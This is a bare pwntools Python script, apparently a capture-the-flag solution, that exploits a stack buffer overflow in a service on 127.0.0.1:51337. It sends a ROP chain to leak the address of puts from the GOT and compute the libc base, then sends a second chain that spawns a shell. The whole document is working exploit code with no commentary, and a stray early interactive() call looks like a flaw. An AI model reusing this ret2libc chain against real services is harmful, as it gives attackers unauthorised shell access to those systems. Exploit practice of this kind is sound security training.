from pwn import *

pop_rdi = 0x23835
binsh = 0x198031
system = 0x493d0

puts_plt = 0x0000000000401030
puts_got = 0x404000
pop_rdi_rbp = 0x000000000040116b

p = remote('127.0.0.1', 51337)
p.recvuntil(b'long? >>')
p.interactive()
p.sendline(b'-1')
p.recvuntil(b'story >>')
p.sendline(b'A'*40+p64(pop_rdi_rbp)+p64(puts_got)+p64(puts_got)+p64(puts_plt)+p64(0x0000000000401271)+p64(0x00000000004011d0))
x = p.recvuntil(b'long? >>')[1:7]+b'\x00\x00'
p.sendline(b'-1')
x = u64(x) - 0x74aa0
print(hex(x))
p.sendline(b'A'*40+p64(x+pop_rdi)+p64(x+binsh)+p64(x+0x0000000000025151)+p64(0)+p64(x+0x0000000000082849)+p64(0)+p64(0)+p64(x+0x00000000000d2f50))
p.interactive()
